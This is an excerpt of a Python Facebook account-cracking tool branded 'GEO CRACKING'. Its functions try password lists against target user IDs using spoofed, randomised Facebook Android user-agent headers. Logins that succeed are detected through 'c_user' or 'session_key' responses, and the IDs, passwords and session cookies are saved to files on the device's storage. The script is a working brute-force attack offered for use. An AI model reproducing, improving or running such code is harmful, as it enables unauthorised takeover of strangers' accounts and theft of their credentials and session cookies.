    ...
    rprint("""[bold yellow]
              ...
              ╚██████╔╝███████╗╚██████╔╝
               ╚═════╝ ╚══════╝ ╚═════╝ 
                     ...
                     [bold red]DEVELOPED BY [bold cyan]GEO
...
def m1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write("\r\r\033[1;36m GEO CRACKING\033[1;35m(\033[1;37m%s\033[1;35m) \033[1;32mOK•%s \033[1;31mCP•%s"%(loop,len(oks),len(cps)));sys.stdout.flush()
    ...
    try:
        ...
        for pass2 in passlist:
            ...
            if "c_user" in exc:
                rprint(" [bold green]\n[OK] USERID: [bold cyan]%s\n[bold green] PASS: [bold cyan]%s\n [bold green]DATE: %s\n [bold green]"%(ids,pas,joined(ids),cookie))
                oks.append(ids)
                open("/sdcard/geo-ok.txt","a").write(ids+" | "+pas+" | "+cookie)
                break
...
def m2(ids,names,passlist):
    ...
    try:
        ...
        for pw in passlist:
            ...
            headers={
                    'User-Agent': f"[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,80000000)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=2.1,width=1080, height=1470};FBLC/en_US;FBRV/382.0.0.9.198;FBCR/GCI Alaska;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/X604;FBSV/12;FBOP/1;FBCA/arm64-v8a:]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=3.2, width=1080,height=1489};FBLC/en_US;FBRV/271.0.0.6.175;FBCR/SemaTel;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX309R;FBSV/12;FB0P/1;FBCA/arm64-v8a:]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=2.5,width=1080,height=1430};FBLC/en_US;FBRV/309.0.0.2.174;FBCR/Reliance Jio;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX31ZT;FBSV/12;FBOP/1;FBCA/arm 64-v8:]"%(fbpnn),
              'Content-Type': 'application/x-www-form-urlencoded', 
            ...
            if 'session_key' in req:
                ...
                print('\r\r \033[1;32m[GEO•OK] '+ids+'|'+pas)
                open('/sdcard/GEO-ALIVE.txt','a').write(ids+' | '+pas+'\n')
                open('/sdcard/GEO-COOKIES.txt','a').write(ids+" | "+pas+" | "+coki+"\n")
                oks.append(ids)
                break
